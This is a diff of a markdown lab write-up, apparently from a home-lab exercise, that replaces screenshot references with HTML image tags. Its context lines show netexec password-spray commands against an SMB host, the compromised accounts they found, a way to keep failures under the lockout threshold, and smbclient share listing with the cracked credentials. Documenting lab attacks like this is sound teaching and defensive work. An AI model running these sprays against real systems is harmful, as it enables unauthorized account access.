@@ -13,7 +13,10 @@ Result: `DESKTOP-F0JVTQT`, Windows 10 Build 19041 x64, `signing:False`, `SMBv1:N
 netexec smb 192.168.100.108 -u users.txt -p 'Winter2024!'
 ```
 Result: all users `STATUS_LOGON_FAILURE` except **`[+] DESKTOP-F0JVTQT\dwilliams:Winter2024!`** — first compromise.
-📸 `evidence/01-kali-spray-round1.png`
+
+<p align="center">
+  <img src="./evidence/01-kali-spray-round1.png" width="80%" alt="Kali spray round 1">
+</p>
 
 ## Step 3 — Spray Round 2: password `Password1` (low-and-slow, after delay)
 
@@ -21,7 +24,10 @@ Result: all users `STATUS_LOGON_FAILURE` except **`[+] DESKTOP-F0JVTQT\dwilliams
 netexec smb 192.168.100.108 -u users.txt -p 'Password1'
 ```
 Result: `dwilliams`, `asmth`, `lgarcia`, `rtan`, `okim`, `mflores` all `STATUS_LOGON_FAILURE`; **`[+] DESKTOP-F0JVTQT\jdoe:Password1`** — second compromise (jdoe reused the weak password from Case 1).
-📸 `evidence/02-kali-spray-round2.png`
+
+<p align="center">
+  <img src="./evidence/02-kali-spray-round2.png" width="80%" alt="Kali spray round 2">
+</p>
 
 **No `ACCOUNT_LOCKED_OUT` anywhere** — every account stayed at ≤2 failures, below the lockout threshold of 5.
 
@@ -31,7 +37,10 @@ Result: `dwilliams`, `asmth`, `lgarcia`, `rtan`, `okim`, `mflores` all `STATUS_L
 smbclient -L //192.168.100.108 -U dwilliams%Winter2024!
 ```
 Result: shares enumerated (`ADMIN$`, `C$`, `IPC$` listed). (Trailing SMB1 reconnect error is harmless — SMBv1 disabled.)
-📸 `evidence/03-kali-successful-access.png`
+
+<p align="center">
+  <img src="./evidence/03-kali-successful-access.png" width="80%" alt="Successful SMB access">
+</p>
 
 ## Attack window
 
